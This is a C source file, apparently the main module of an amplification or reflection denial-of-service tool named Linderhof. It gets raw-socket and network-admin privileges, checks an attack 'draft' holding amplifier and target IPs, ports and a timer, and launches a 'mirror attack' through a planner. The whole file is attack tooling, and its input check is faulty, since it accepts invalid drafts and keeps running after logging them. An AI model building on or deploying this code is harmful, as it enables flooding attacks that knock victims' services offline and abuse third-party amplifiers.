#include <pthread.h>
#include "venus.h"
#include "common/capabilityHelper.h"
#include "commander/planner.h"
#include "commander/executor.h"
#include "interface/oryx.h"

static void closeLhf()
{
    Elog(SUCCESS, "Closing lhf\n");
#ifdef ORYXNET
    CloseOryxNet();
#endif
    memoryclean();
}

#ifdef ORYXNET
void LinderhofNet()
{
    linderhofBootstrap(); 
    OryxNet();
}
#endif

static void fatalHandler(int p_arg)
{
    printf("Fatal error\n");
    closeLhf();
    exit(p_arg);
}

static void closeHandler(int p_arg)
{
    closeLhf();
    exit(0);
}

static bool validateDraft( LhfDraft p_draft )
{
    if( !is_valid_ipv4( p_draft.amp_ip) &&
        !is_valid_ipv4( p_draft.target_ip))
    {
        return false; 
    }

    if( p_draft.target_port < 0 &&
        p_draft.amp_port    < 0 &&
        p_draft.timer < 0)
    {
        return false;
    }

    return true;    
}

void linderhofBootstrap()
{
    SetSigHdr(SIGINT,  closeHandler);
    SetSigHdr(SIGQUIT, closeHandler);
    SetSigHdr(SIGPIPE, fatalHandler);
    ESetErroAction(fatalHandler);
    SetCapability(CAP_NET_RAW);
    SetCapability(CAP_NET_ADMIN);
}

void LinderhofCli( int p_argc, char **p_argv )
{
    linderhofBootstrap();
    OryxCli(p_argc, p_argv);
}

int StartMirrorAttack( LhfDraft p_draft )
{
    LhfPlan *plan;

    if( !validateDraft( p_draft ) )
    {
        ELOG(ERROR_DRAFT, "Invalid draft\n");
    }

    plan = Planner( &p_draft );
    HallOfMirrors(plan);

    return SUCCESS;
}

